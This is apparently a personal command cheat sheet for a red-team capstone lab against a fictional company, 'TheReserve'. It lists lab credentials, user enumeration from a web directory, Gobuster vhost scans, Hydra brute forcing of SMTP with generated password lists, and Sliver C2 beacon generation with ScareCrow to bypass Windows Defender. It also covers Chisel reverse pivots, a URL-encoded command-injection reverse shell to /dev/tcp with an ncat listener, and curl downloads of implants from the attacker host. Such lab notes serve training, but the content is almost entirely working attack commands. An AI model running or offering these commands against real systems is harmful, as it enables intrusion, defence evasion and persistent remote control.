# Red-Team-Capstone-Challenge CMD-by-CMDs


[[Red-Team-Capstone-Challenge-Credentials]]

```bash
sed -i 's///g' *-CMD-by-CMDs.md
```

```
The password policy for TheReserve is the following:

* At least 8 characters long
* At least 1 number
* At least 1 special character
* Special Characters: `  !@#$%^  `
```

```
ssh e-citizen@10.200.121.250
stabilitythroughcurrency

=======================================
Username: nvm
Password: PvH2VJqhnPMcbc0t
MailAddr: nvm@corp.th3reserve.loc
IP Range: 10.200.121.0/24
=======================================
```

Host management - update addDomainsToEctHosts.sh 
```bash
#!/bin/bash

echo "10.200.89.11 mail.thereserve.loc MAIL.thereserve.loc  " | sudo tee -a /etc/hosts
echo "10.200.89.12 thereserve.loc " | sudo tee -a /etc/hosts
echo "10.200.89.13 web.thereserve.loc WEB.thereserve.loc " | sudo tee -a /etc/hosts
# vpn key required
echo "10.200.89.21 WRK1.corp.thereserve.loc" | sudo tee -a /etc/hosts
echo "10.200.89.22 WRK2.corp.thereserve.loc " | sudo tee -a /etc/hosts
```

Replace the third octet IPs
```bash
sudo sed -i 's/.121./.118./g' /etc/hosts
sed 's/.117./.103./g' -i internalHosts.txt
```

Initial
```bash
curl http://10.200.121.13/october/themes/demo/assets/images/ -o images
cat images | cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
# Developer on the root webapge.
echo "aimee.walker" >> users.txt
echo "patrick.edwards" >> users.txt
cat users.txt | awk '{print $1"@corp.thereserve.loc"}' >> emails.txt
echo "applications@corp.thereserve.loc" >> email.txt
crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
```

Silver and EDR bypassing Scarecrow
```go
// 
// remember to upx
// For VPN
generate --mtls 10.50.99.131:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
generate beacon --mtls 10.50.99.131:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
mtls -L 10.50.99.131 -l 11011
mtls -L 10.50.99.131 -l 11012

// Server 1
generate beacon --mtls 10.50.99.131:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
// ScareCrow to bypass Windows Defender - shoot fly with bozaka
./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
```

Chisel Organisation
```go
// remove glibc version issues be remove dependencies!
export CGO_ENABLED=0
go build -ldflags="-s -w"
// Edit proxychains file
sudo vim /etc/proxychains4.conf
socks5 $ip $port 
// VPN chisel server
./chisel server -p 20000 -reverse -socks -v


// VPN chisel Client - local pivot
nohup ./chisel client 10.50.99.131:20000 20001:127.0.0.1:20000 &
// 01-09 for individual VPN client pivots, socks, fowards
nohup ./chisel client 10.50.99.131:20000 R:127.0.01:20002:socks &


// 11-19 for individual * client pivots 

nohup ./chisel client $VPNipaddress:$specificPort $pivotPort:127.0.0.1:$pivotPort &

// reverse port forward syntax for the granular needs
nohup ./chisel client 10.50.99.131:20000 R:127.0.0.1:6379:172.19.0.2:6379 &

// reverse port forward syntax for the granular needs
nohup ./chisel client 10.50.99.131:20000 R:127.0.0.1: &
```


New
```bash
# https://stackoverflow.com/questions/7110119/bash-history-without-line-numbers
history | cut -c 8-
```

```bash
# 
gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -o vhosts.gb
#
gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
# $WORD from password_base_list
mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
# Hydra the SMTP server
hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
```

Considerations
```
cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
```

```bash
# http://10.200.121.12/
mohammad.ahmed@corp.thereserve.loc

```

```bash


rlwrap ncat -lvnp 36969 
;/bin/bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.114.111/36969+<%261'

curl http://10.50.99.131:8443/VPN-update -o VPN-update

```



## Installs

```bash
curl https://sliver.sh/install|sudo bash

sudo apt install thunderbird remmina certipy-ad -y
# Authenicate
# ssh e-citizen@10.200.121.250 - stabilitythroughcurrency
thunderbird
# nvm : nvm@corp.th3reserve.loc $somePassword
# Change the outbound server to 587

git clone https://github.com/r3nt0n/bopscrk.git
cd bopscrk;
pip3 install -r requirements.txt
python3 bopscrk.py -i

cd ~/RedTeamCapstoneChallenge
curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  
```
